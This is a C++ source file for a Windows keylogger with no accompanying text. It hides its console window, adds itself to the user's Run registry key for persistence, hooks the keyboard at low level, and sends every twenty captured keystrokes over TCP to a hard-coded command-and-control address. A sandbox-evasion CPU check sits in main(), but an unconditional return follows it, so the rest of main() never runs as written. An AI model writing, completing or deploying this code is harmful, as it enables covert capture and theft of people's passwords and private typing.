#define _WIN32_WINNT 0x0500 // min win version
#define HIDDEN // comment out to show window
#define PORT_NUMBER     8080
#define SERVER_ADDRESS  "172.17.0.1"

#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>

#ifndef HIDDEN
	#include <cstdio> // printf
#endif

#pragma comment(lib, "Ws2_32.lib") // needed for sockets
#define DEFAULT_BUFLEN 1024

// timer for sending to cnc
int buffsize = 0;
int th = 20;
char buffer[21]; // +1 for \n

// HANDLE to the hook
HHOOK _hook;

// Contains information about a low-level keyboard input event, e.g. the keyCode
KBDLLHOOKSTRUCT kbdStruct;

void registerForStartup()
{
	// get path of exe
	char filepath[MAX_PATH];
	GetModuleFileName(NULL, filepath, MAX_PATH);

	// get handle to autostart key
	LPCSTR lpSubKey = TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
	HKEY hKey;

	// open key
	RegOpenKeyEx(HKEY_CURRENT_USER,lpSubKey,0,KEY_WRITE,&hKey);
	PHKEY phkResult;

	// write executable path to regkey
	LPCTSTR value = TEXT("TestSoftwareKey");
        LPCTSTR data = filepath;
	LONG setRes = RegSetValueEx(hKey,value,0,REG_SZ,(LPBYTE)data,strlen(data)+1);

	// close
	RegCloseKey(hKey);
}

void sendbuf()
{
    WSADATA wsaver;
    int iResult = WSAStartup(MAKEWORD(2,2), &wsaver);
	if (iResult != NO_ERROR) {
		#ifndef HIDDEN
        	wprintf(L"WSAStartup failed with error: %d\n", iResult);
		#endif
		exit(1);
    }
    SOCKET tcpsock = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	if (tcpsock == INVALID_SOCKET) {
        #ifndef HIDDEN
			wprintf(L"socket failed with error: %ld\n", WSAGetLastError());
        #endif
		WSACleanup();
		exit(1);
    }
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(SERVER_ADDRESS);
    addr.sin_port = htons(PORT_NUMBER);

    iResult = connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr));
    if (iResult == SOCKET_ERROR) {
        #ifndef HIDDEN
        	wprintf(L"connect failed with error: %d\n", WSAGetLastError() );
        #endif
 	closesocket(tcpsock);
        WSACleanup();
	exit(1);
    }

    // send current buffer
    send(tcpsock, buffer, strlen(buffer)+1, 0);
    memset(buffer, 0, sizeof(buffer));

    closesocket(tcpsock);
    WSACleanup();
}

// Win32Api function for a hook
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		if (wParam == WM_KEYDOWN)
		{
			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
			unsigned char * p = (unsigned char*)&kbdStruct;
			bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) != 0);

			if (*p != VK_SHIFT)
				buffer[buffsize++] = shiftPressed ? *p : tolower(*p);

			if (buffsize == th)
			{
				sendbuf();
				buffsize = 0;
			}
		}
	}

	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

int main()
{

    // check CPU
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
    if (numberOfProcessors < 2) return 1;
    return 0;


    // alloc window and hide
    HWND whandle = GetConsoleWindow();
    AllocConsole();
    whandle = FindWindowA("ConsoleWindowClass", NULL);

    #ifdef HIDDEN
        ShowWindow(whandle, SW_HIDE);
    #endif
    #ifndef HIDDEN
	ShowWindow(whandle, SW_SHOWNORMAL);
    #endif

    registerForStartup();

    // Set the hook and set it to use the callback function above

    // WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
    // The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
    // function that sets and releases the hook.
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
    {
    	return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)); // get message events like key inputs
    {
    }

    return 0;
}
